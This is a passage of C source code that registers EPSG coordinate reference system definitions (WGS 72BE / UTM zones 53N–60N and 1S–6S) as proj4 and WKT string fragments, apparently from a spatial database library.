\"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32452\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32453, \"epsg\", 32453,\n        \"WGS 72BE / UTM zone 53N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=53 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 53N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",135],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32453\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32454, \"epsg\", 32454,\n        \"WGS 72BE / UTM zone 54N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=54 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 54N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",141],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32454\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32455, \"epsg\", 32455,\n        \"WGS 72BE / UTM zone 55N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=55 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 55N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",147],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32455\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32456, \"epsg\", 32456,\n        \"WGS 72BE / UTM zone 56N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=56 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 56N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",153],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32456\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32457, \"epsg\", 32457,\n        \"WGS 72BE / UTM zone 57N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=57 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 57N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",159],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32457\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32458, \"epsg\", 32458,\n        \"WGS 72BE / UTM zone 58N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=58 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 58N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",165],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32458\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32459, \"epsg\", 32459,\n        \"WGS 72BE / UTM zone 59N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=59 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 59N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",171],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32459\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32460, \"epsg\", 32460,\n        \"WGS 72BE / UTM zone 60N\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=60 +ellps=WGS72 +towgs84=0,0,1.9,0,0,0.8\");\n    add_proj4text (p, 1,\n        \"14,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 60N\\\",GEOGCS[\\\"WGS 72BE\\\",D\");\n    add_srs_wkt (p, 1,\n        \"ATUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",177],PARAMETER[\\\"scale_f\");\n    add_srs_wkt (p, 9,\n        \"actor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PARA\");\n    add_srs_wkt (p, 10,\n        \"METER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 11,\n        \"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\");\n    add_srs_wkt (p, 12,\n        \"\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32460\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32501, \"epsg\", 32501,\n        \"WGS 72BE / UTM zone 1S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=1 +south +ellps=WGS72 +towgs84=0,0,1.9,0\");\n    add_proj4text (p, 1,\n        \",0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 1S\\\",GEOGCS[\\\"WGS 72BE\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-177],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32501\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32502, \"epsg\", 32502,\n        \"WGS 72BE / UTM zone 2S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=2 +south +ellps=WGS72 +towgs84=0,0,1.9,0\");\n    add_proj4text (p, 1,\n        \",0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 2S\\\",GEOGCS[\\\"WGS 72BE\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-171],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32502\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32503, \"epsg\", 32503,\n        \"WGS 72BE / UTM zone 3S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=3 +south +ellps=WGS72 +towgs84=0,0,1.9,0\");\n    add_proj4text (p, 1,\n        \",0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 3S\\\",GEOGCS[\\\"WGS 72BE\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-165],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32503\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32504, \"epsg\", 32504,\n        \"WGS 72BE / UTM zone 4S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=4 +south +ellps=WGS72 +towgs84=0,0,1.9,0\");\n    add_proj4text (p, 1,\n        \",0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 4S\\\",GEOGCS[\\\"WGS 72BE\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-159],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32504\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32505, \"epsg\", 32505,\n        \"WGS 72BE / UTM zone 5S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=5 +south +ellps=WGS72 +towgs84=0,0,1.9,0\");\n    add_proj4text (p, 1,\n        \",0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 5S\\\",GEOGCS[\\\"WGS 72BE\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        \",PARAMETER[\\\"central_meridian\\\",-153],PARAMETER[\\\"scale_\");\n    add_srs_wkt (p, 9,\n        \"factor\\\",0.9996],PARAMETER[\\\"false_easting\\\",500000],PAR\");\n    add_srs_wkt (p, 10,\n        \"AMETER[\\\"false_northing\\\",10000000],UNIT[\\\"metre\\\",1,AUT\");\n    add_srs_wkt (p, 11,\n        \"HORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"32505\\\"]]\");\n    p = add_epsg_def (filter, first, last, 32506, \"epsg\", 32506,\n        \"WGS 72BE / UTM zone 6S\");\n    add_proj4text (p, 0,\n        \"+proj=utm +zone=6 +south +ellps=WGS72 +towgs84=0,0,1.9,0\");\n    add_proj4text (p, 1,\n        \",0,0.814,-0.38 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"WGS 72BE / UTM zone 6S\\\",GEOGCS[\\\"WGS 72BE\\\",DA\");\n    add_srs_wkt (p, 1,\n        \"TUM[\\\"WGS_1972_Transit_Broadcast_Ephemeris\\\",SPHEROID[\\\"\");\n    add_srs_wkt (p, 2,\n        \"WGS 72\\\",6378135,298.26,AUTHORITY[\\\"EPSG\\\",\\\"7043\\\"]],TO\");\n    add_srs_wkt (p, 3,\n        \"WGS84[0,0,1.9,0,0,0.814,-0.38],AUTHORITY[\\\"EPSG\\\",\\\"6324\");\n    add_srs_wkt (p, 4,\n        \"\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]\");\n    add_srs_wkt (p, 5,\n        \"],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 6,\n        \"\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4324\\\"]],PROJECTION[\\\"Tr\");\n    add_srs_wkt (p, 7,\n        \"ansverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0]\");\n    add_srs_wkt (p, 8,\n        